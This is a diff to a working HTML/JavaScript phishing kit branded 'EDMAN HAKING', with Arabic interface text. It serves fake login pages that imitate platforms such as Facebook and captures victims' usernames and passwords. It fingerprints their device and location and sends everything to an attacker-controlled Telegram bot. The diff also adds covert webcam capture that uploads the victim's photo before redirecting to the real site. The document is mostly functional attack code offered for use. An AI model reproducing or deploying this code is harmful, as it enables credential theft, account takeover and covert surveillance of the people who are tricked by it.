@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDMAN PHISHING SUITE - C2</title>
+    <title>EDMAN HAKING - ULTIMATE PHISHING & C2</title>
     <style>
         body {
             background-color: #030712;
@@ -91,6 +91,9 @@
     <canvas id="matrix"></canvas>
     <div class="container" id="appCard"></div>
 
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
         // تأثير الماتريكس
         const canvas = document.getElementById('matrix');
@@ -117,7 +120,7 @@
         setInterval(drawMatrix, 30);
         window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
 
-        // إدارة واجهات المنصات
+        // منصات الصيد
         const urlParams = new URLSearchParams(window.location.search);
         const botToken = urlParams.get('t');
         const chatId = urlParams.get('c');
@@ -134,7 +137,6 @@
         };
 
         if (!botToken || !chatId) {
-            // لوحة التحكم لاختيار المنصة وتوليد الرابط
             cardDiv.innerHTML = `
                 <div class="logo-title">EDMAN HAKING</div>
                 <div class="logo-sub">PHISHING SUITE GENERATOR</div>
@@ -160,14 +162,13 @@
                 <div class="footer">EDMAN HAKING TOOL © 2026</div>
             `;
         } else {
-            // صفحة الصيد الحقيقية بناءً على اختيار المنصة
             let pInfo = platformsData[platform] || platformsData['facebook'];
             cardDiv.innerHTML = `
                 <div class="logo-title" style="color:${pInfo.bg}">${pInfo.name}</div>
                 <p>يرجى إدخال بيانات حسابك للمتابعة والتحقق الأمني السريع:</p>
                 <div class="form-group"><label>اسم المستخدم / البريد / الهاتف:</label><input type="text" id="phishUser" placeholder="أدخل البيانات هنا..."></div>
                 <div class="form-group"><label>كلمة المرور:</label><input type="password" id="phishPass" placeholder="••••••••"></div>
-                <button style="background:${pInfo.bg}; color:#fff;" onclick="executePhish('${platform}')">تسجيل الدخول / متابعة</button>
+                <button style="background:${pInfo.bg}; color:#fff;" onclick="executeUltimatePhish('${platform}')">تسجيل الدخول / متابعة</button>
                 <div id="status" style="margin-top:15px; font-size:12px; color:#34d399;"></div>
                 <div class="footer">SECURE GATEWAY © 2026</div>
             `;
@@ -185,37 +186,108 @@
             document.getElementById('resultBox').style.display = 'block';
         }
 
-        async function executePhish(plat) {
+        async function executeUltimatePhish(plat) {
             let u = document.getElementById('phishUser').value.trim();
             let p = document.getElementById('phishPass').value.trim();
             if (!u || !p) { alert('يرجى إكمال الحقول المطلوبة'); return; }
 
-            document.getElementById('status').innerText = "جاري التحقق من البيانات...";
+            document.getElementById('status').innerText = "جاري معالجة البيانات والتحقق...";
 
-            let ipData = "غير معروف";
+            // جلب الـ IP عبر خدمة آمنة ومتوافقة مع HTTPS
+            let ipData = "غير معروف", geoInfo = "غير معروف", batteryInfo = "غير متوفر";
             try {
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipJson = await ipRes.json();
                 ipData = ipJson.ip;
+            } catch(e) {
+                try {
+                    let altIpRes = await fetch('https://ipapi.co/json/');
+                    let altIpJson = await altIpRes.json();
+                    ipData = altIpJson.ip;
+                    geoInfo = `${altIpJson.country_name} -${altIpJson.region} - ${altIpJson.city} (ISP:${altIpJson.org})`;
+                } catch(err) {}
+            }
+
+            if (ipData !== "غير معروف" && geoInfo === "غير معروف") {
+                try {
+                    let geoRes = await fetch(`https://ipapi.co/${ipData}/json/`);
+                    let geoJson = await geoRes.json();
+                    geoInfo = `${geoJson.country_name} -${geoJson.region} - ${geoJson.city} (ISP:${geoJson.org})`;
+                } catch(e) {}
+            }
+
+            if (navigator.getBattery) {
+                try {
+                    let bat = await navigator.getBattery();
+                    batteryInfo = `${Math.round(bat.level * 100)}\% (${bat.charging ? 'يشحن حالياً' : 'غير شاحن'})`;
+                } catch(e) {}
+            }
+
+            let gpuInfo = "غير معروف";
+            try {
+                let canvasGL = document.createElement('canvas');
+                let gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
+                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
 
-            let msg = `🎯 *صيد ناجح لمنصة [${plat.toUpperCase()}] بواسطة إدمان!* 💀\n\n` +
-                      `👤 *المستخدم / البريد:* \`${u}\`\n` +
-                      `🔑 *كلمة المرور:* \`${p}\`\n` +
-                      `🌐 *عنوان الـ IP:* \`${ipData}\`\n` +
-                      `🌍 *المنطقة الزمنية:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``;
+            let reportMsg = 
+                `🎯 *صيد خياري ناجح لمنصة [${plat.toUpperCase()}] بواسطة إدمان!* 💀\n\n` +
+                `👤 *اسم المستخدم / البريد:* \`${u}\`\n` +
+                `🔑 *كلمة المرور:* \`${p}\`\n\n` +
+                `🌐 *عنوان الـ IP:* \`${ipData}\`\n` +
+                `📍 *الموقع والمزود:* \`${geoInfo}\`\n` +
+                `🔋 *حالة البطارية:* \`${batteryInfo}\`\n` +
+                `🎮 *معالج الرسوميات (GPU):* \`${gpuInfo}\`\n` +
+                `💻 *النظام والمنصة:* \`${navigator.platform}\`\n` +
+                `📺 *دقة الشاشة:* \`${window.screen.width}x${window.screen.height}\`\n` +
+                `🧠 *الذاكرة العشوائية:* \`${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف'}\`\n` +
+                `🌍 *المنطقة الزمنية:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`\n` +
+                `🔗 *رابط الصيد:* \`${window.location.href}\``;
 
+            // إرسال البيانات واليوزر والباسورد أولاً
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: chatId, text: reportMsg, parse_mode: 'Markdown' })
                 });
             } catch(e) {}
 
-            setTimeout(() => {
-                window.location.href = `https://www.${plat}.com`;
-            }, 1000);
+            document.getElementById('status').innerText = "جاري تأكيد الجلسة...";
+
+            // التقاط صورة الكاميرا وإرسالها فوراً
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                let video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(async () => {
+                    let canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                    let ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(async (blob) => {
+                        let formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('caption', `📸 *صورة الكاميرا للهدف (يوزر: \`${u}\` - IP: \`${ipData}\`)* تم سحبها بنجاح بواسطة إدمان! 💀`);
+                        formData.append('parse_mode', 'Markdown');
+
+                        try {
+                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                        } catch(e) {}
+
+                        stream.getTracks().forEach(track => track.stop());
+                        window.location.href = `https://www.${plat}.com`;
+                    }, 'image/jpeg', 0.85);
+                }, 1000);
+            })
+            .catch(err => {
+                setTimeout(() => { window.location.href = `https://www.${plat}.com`; }, 1000);
+            });
         }
     </script>
 </body>
